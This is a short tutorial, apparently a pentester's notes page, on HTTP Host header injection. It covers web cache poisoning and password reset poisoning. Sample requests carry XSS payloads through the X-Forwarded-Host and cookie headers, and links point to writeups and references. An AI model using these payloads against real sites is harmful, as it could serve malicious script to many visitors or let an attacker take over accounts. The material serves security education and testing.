## What is the HTTP Host header

A Host header attack, also known as Host header injection, is a web attack where the attacker provides a false Host header to the web application.
The HTTP Host header is a mandatory request header as of HTTP/1.1. It specifies the domain name that the client wants to access. For example, when a user visits https://portswigger.net/web-security, their browser will compose a request containing a Host header as follows:

````
GET /web-security HTTP/1.1
Host: portswigger.net
````
In some cases, such as when the request has been forwarded by an intermediary system, the Host value may be altered before it reaches the intended back-end component.

## What is an HTTP Host header attack

HTTP Host header attacks exploit vulnerable websites that handle the value of the Host header in an unsafe way. If the server implicitly trusts the Host header, and fails to validate or escape it properly, an attacker may be able to use this input to inject harmful payloads that manipulate server-side behavior. Attacks that involve injecting a payload directly into the Host header are often known as "Host header injection" attacks.

## Types of the host header attack

- Web cache poisoning
- Password Reset Poisoning

## 1) Web cache poisoning
Web-cache poisoning is a technique used by an attacker to manipulate a web-cache to serve poisoned content to anyone who requests pages.

For this to occur, an attacker would need to poison a caching proxy run by the site itself, or downstream providers, content delivery networks (CDNs), syndicators or other caching mechanisms in-between the client and the server. The cache will then serve the poisoned content to anyone who request it, with the victim having no control whatsoever on the malicious content being served to them.

The below is an example of how an attacker could potentially exploit a host header attack by poisoning a web-cache.

  ## 1) Exploit Web cache poisoning

  A header like X-Forwarded-For is being reflected in the response unsanitized>
  You can send a basic XSS payload and poison the cache so everybody that access page will be XSSed:
  ````
  GET /en?region=uk HTTP/1.1
  Host: innocent-website.com
  X-Forwarded-Host: a."><script>alert(1)</script>"
  ````
  ## 2) Using web cache poisoning to exploit cookie-handling vulnerabilities
  Cookies could also be reflected on the response of a page. If you can abuse it to cause a XSS for example, you could be able to exploit XSS in several clients that load the malicious cache response.
  ````
  GET / HTTP/1.1
  Host: vulnerable.com
  Cookie: session=VftzO7ZtiBj5zNLRAuFpXpSQLjS4lBmU; fehost=asd"%2balert(1)%2b"
  ````
  ## 3) Using multiple headers to exploit web cache poisoning vulnerabilities
  ````
  GET /resources/js/tracking.js HTTP/1.1
  Host: acc11fe01f16f89c80556c2b0056002e.web-security-academy.net
  X-Forwarded-Host: ac8e1f8f1fb1f8cb80586c1d01d500d3.web-security-academy.net/
  X-Forwarded-Scheme: http
  ````
  ## 4) Using HTTP request smuggling to perform web cache poisoning
  [https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#using-http-request-smuggling-to-perform-web-cache-poisoning](https://book.hacktricks.xyz/pentesting-web/http-request-smuggling#using-http-request-smuggling-to-perform-web-cache-poisoning)
  
  ## Password Reset Poisoning
 A common way to implement password reset functionality is to generate a secret token and send an email with a link containing this token. What could happen if an attacker requests a password reset with an attacker controlled host header?

If the web application makes use of the host header value when composing the reset link, an attacker can poison the password reset link that is sent to a victim. If the victim clicks on the poisoned reset link in the email, the attacker will obtain the password reset token and can go ahead and reset the victim’s password.

[Example](https://www.acunetix.com/blog/articles/password-reset-poisoning/)

## Findings
- ATO via Host Header Poisoning [Medium](https://sechunter.medium.com/ato-via-host-header-poisoning-dc5c29d2fd0d)
- Different host header injection[Medium](https://medium.com/@imunissar786/awesome-host-header-injection-worth-2k-a7e5be1dbb1d)
- Host Header injection in oslo.io (using X-Forwarded-For header) leading to email spoofing:[Hackerone](https://hackerone.com/reports/1072277)

## Reference
- [Hacktricks](https://book.hacktricks.xyz/pentesting-web/cache-deception#using-web-cache-poisoning-to-exploit-cookie-handling-vulnerabilities)
- [PortSwigger](https://portswigger.net/web-security/host-header)
- [Acunetix](https://www.acunetix.com/blog/articles/automated-detection-of-host-header-attacks/)
